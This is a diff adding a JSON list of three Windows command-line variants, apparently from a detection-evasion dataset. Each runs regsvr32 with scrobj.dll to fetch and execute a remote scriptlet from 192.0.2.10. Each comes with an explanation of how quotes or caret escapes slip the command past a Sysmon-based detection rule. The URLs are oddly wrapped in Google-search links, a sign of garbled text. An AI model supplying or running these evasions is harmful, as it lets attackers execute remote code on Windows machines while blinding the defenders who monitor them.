@@ -1,0 +1,14 @@
+[
+{
+"output": "C:\Windows\system32\regsvr32.exe /s /u /i:"[http://192.0.2.10/test.sct](https://www.google.com/search?q=http://192.0.2.10/test.sct)" scrobj.dll",
+"explanation": "Insertion technique: Placing double quotes around the URL parameter block converts the raw process creation command token to log `/i:\"http://1` instead of the explicit `/i:http://1` substring pattern. The internal Windows API removes the enclosing parameter quotes during delivery to the tool, ensuring execution context remains stable while preventing a regex match in selection_ip."
+},
+{
+"output": "cmd.exe /c "C:\Windows\system32\regsvr32.exe /s /u /i^:[http://192.0.2.10/test.sct](https://www.google.com/search?q=http://192.0.2.10/test.sct) scrobj.dll"",
+"explanation": "Insertion technique: Injects the command interpreter's caret escape indicator ('^') directly into the identifier component block to form `/i^:http://`. Wrapping the command string within cmd.exe strips the escape symbol prior to process execution. However, the raw Sysmon process creation telemetry retains the literal caret pattern, avoiding the strict token validation."
+},
+{
+"output": "C:\Windows\system32\regsvr32.exe /s /u "/i:[http://192.0.2.10/test.sct](https://www.google.com/search?q=http://192.0.2.10/test.sct)" scrobj.dll",
+"explanation": "Insertion technique: Encloses the option specifier and its associated remote payload URL block together within double quotes. Because the telemetry log rules seek specific unquoted combinations such as ` /i:http://`, this formatting modification safe-guards the simulation from detection, while standard Windows argument parsing maps the switches correctly."
+}
+]
